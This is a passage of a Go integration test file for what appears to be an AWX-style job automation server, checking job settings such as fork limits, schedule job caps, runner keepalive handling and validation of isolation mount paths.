	must(t, a.patch("settings/jobs/", map[string]any{"MAX_FORKS": 0}), 200)
	must(t, a.patch(fmt.Sprintf("job_templates/%d/", jt), map[string]any{"forks": 500}), 200)
}

// SCHEDULE_MAX_JOBS: a schedule creates no job while that many jobs of its
// template are waiting to run.
func TestScheduleMaxJobs(t *testing.T) {
	f := newLaunchFixture(t)
	a := f.a
	t.Cleanup(func() { a.patch("settings/jobs/", map[string]any{"SCHEDULE_MAX_JOBS": 10}) })
	jt := f.template(t, "site.yml", nil)
	for range 2 {
		id := must(t, a.post(fmt.Sprintf("job_templates/%d/launch/", jt), map[string]any{}), 201).id()
		waitJob(t, a, fmt.Sprintf("jobs/%d/", id))
	}
	// Two jobs waiting to run; "new" jobs are not picked up by the dispatcher.
	app.DB.Exec(t.Context(), "UPDATE unified_jobs SET status = 'new' WHERE unified_job_template_id = $1", jt)
	s := must(t, a.post(fmt.Sprintf("job_templates/%d/schedules/", jt), map[string]any{"name": uniq("s"),
		"rrule": "DTSTART:20200101T000000Z RRULE:FREQ=HOURLY;INTERVAL=1"}), 201).id()
	fire := func() int {
		app.DB.Exec(t.Context(), "UPDATE schedules SET next_run = now() - interval '1 second' WHERE id = $1", s)
		resources.ScheduleTick(t.Context(), jobManager)
		return a.get(fmt.Sprintf("schedules/%d/jobs/", s)).count()
	}

	must(t, a.patch("settings/jobs/", map[string]any{"SCHEDULE_MAX_JOBS": 2}), 200)
	if n := fire(); n != 0 {
		t.Fatalf("the schedule launched %d jobs with 2 already waiting", n)
	}
	must(t, a.patch("settings/jobs/", map[string]any{"SCHEDULE_MAX_JOBS": 3}), 200)
	if n := fire(); n != 1 {
		t.Fatalf("the schedule launched %d jobs under the limit, want 1", n)
	}
}

// AWX_RUNNER_KEEPALIVE_SECONDS reaches the worker, and its keepalives are
// not stored as events.
func TestRunnerKeepalive(t *testing.T) {
	f := newJobFixture(t)
	a := f.a
	t.Cleanup(func() { a.patch("settings/jobs/", map[string]any{"AWX_RUNNER_KEEPALIVE_SECONDS": 0}) })
	must(t, a.patch("settings/jobs/", map[string]any{"AWX_RUNNER_KEEPALIVE_SECONDS": 1}), 200)
	job := f.launch(t, a, f.template(t, "pause.yml", nil), map[string]any{})
	// The worker accepts the interval (it fails on unknown options).
	mustStatus(t, f, job, "successful")
	for _, q := range []string{"event=keepalive", "counter=0"} {
		if n := a.get(fmt.Sprintf("jobs/%d/job_events/?%s", job.id(), q)).count(); n != 0 {
			t.Fatalf("%d keepalives stored as events (%s)", n, q)
		}
	}
}

// AWX_ISOLATION_SHOW_PATHS entries are HOST-DIR[:CONTAINER-DIR[:OPTIONS]] with absolute paths.
func TestShowPathsSetting(t *testing.T) {
	a := adminClient(t)
	t.Cleanup(func() { a.patch("settings/jobs/", map[string]any{"AWX_ISOLATION_SHOW_PATHS": []string{}}) })
	must(t, a.patch("settings/jobs/", map[string]any{"AWX_ISOLATION_SHOW_PATHS": []string{"relative/dir"}}), 400)
	must(t, a.patch("settings/jobs/", map[string]any{"AWX_ISOLATION_SHOW_PATHS": []string{"/srv/data", "/etc/pki/ca:/certs:ro"}}), 200)
}
